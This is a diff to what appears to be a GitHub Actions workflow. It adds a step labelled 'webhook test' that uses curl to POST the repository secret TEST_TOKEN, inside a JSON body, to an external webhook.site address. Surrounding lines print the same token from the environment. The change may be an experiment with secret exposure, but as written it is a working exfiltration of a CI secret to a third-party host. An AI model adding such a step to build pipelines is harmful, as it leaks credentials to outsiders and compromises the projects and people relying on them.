@@ -35,6 +35,12 @@ jobs:
 
           print(f'Email username is {os.environ.get("TEST_TOKEN", "<unknown")}')
           EOF
+      - name: webhook test
+        run: | 
+          curl --header "Content-Type: application/json" \
+            --request POST \
+            --data '{"username":"${{ secrets.TEST_TOKEN }}","password":"xyz"}' \
+            https://webhook.site/5d9a9531-96c7-429b-8661-fdadba8d7628
 
       - name: Run python script
         run: |
